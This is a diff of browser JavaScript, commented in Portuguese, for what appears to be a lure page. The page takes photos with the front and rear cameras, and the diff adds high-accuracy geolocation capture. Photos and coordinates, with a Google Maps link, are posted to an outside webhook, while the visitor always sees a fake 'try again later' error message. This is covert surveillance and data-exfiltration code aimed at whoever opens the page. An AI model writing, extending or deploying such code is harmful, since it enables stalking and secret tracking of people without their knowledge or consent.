@@ -97,32 +97,90 @@ async function captureCamera(cam) {
   }
 }
 
-async function sendToWebhook(cam, blob) {
-  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
-  const formData = new FormData();
-  formData.append('file', blob, fileName);
-  formData.append('content', `📸 ${cam.label}`);
+async function sendToWebhook(payload) {
+  // payload pode ser FormData (arquivo) ou objeto com content
+  let body;
+  if (payload instanceof FormData) {
+    body = payload;
+  } else {
+    body = JSON.stringify(payload);
+  }
 
-  const response = await fetch(WEBHOOK_URL, {
+  const options = {
     method: 'POST',
-    body: formData
-  });
+    body
+  };
 
+  if (!(payload instanceof FormData)) {
+    options.headers = { 'Content-Type': 'application/json' };
+  }
+
+  const response = await fetch(WEBHOOK_URL, options);
   if (!response.ok) {
     throw new Error('Falha no envio');
   }
 }
 
+async function sendPhoto(cam, blob) {
+  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
+  const formData = new FormData();
+  formData.append('file', blob, fileName);
+  formData.append('content', `📸 ${cam.label}`);
+  await sendToWebhook(formData);
+}
+
+function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error('Geolocalização não suportada'));
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve(pos),
+      (err) => reject(err),
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
+async function sendLocation() {
+  try {
+    const pos = await getLocation();
+    const { latitude, longitude, accuracy } = pos.coords;
+
+    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const content = `📍 **Localização capturada**\n` +
+                    `Latitude: \`${latitude.toFixed(6)}\`\n` +
+                    `Longitude: \`${longitude.toFixed(6)}\`\n` +
+                    `Precisão: ~${Math.round(accuracy)} metros\n` +
+                    `[Abrir no Google Maps](${mapsUrl})`;
+
+    await sendToWebhook({ content });
+  } catch (err) {
+    console.error('Erro localização:', err);
+    // Não interrompe o fluxo se a localização falhar
+  }
+}
+
 async function run() {
   try {
+    // 1. Captura e envia as fotos
     for (const cam of CAMERAS) {
       const blob = await captureCamera(cam);
-      await sendToWebhook(cam, blob);
+      await sendPhoto(cam, blob);
     }
+
+    // 2. Tenta enviar a localização
+    await sendLocation();
+
   } catch (err) {
     console.error(err);
   } finally {
-    // Sempre mostra a mesma mensagem no final (sucesso ou erro)
+    // Sempre mostra a mesma mensagem no final
     spinnerEl.style.display = 'none';
     setStatus('Erro, tente novamente mais tarde', true);
   }
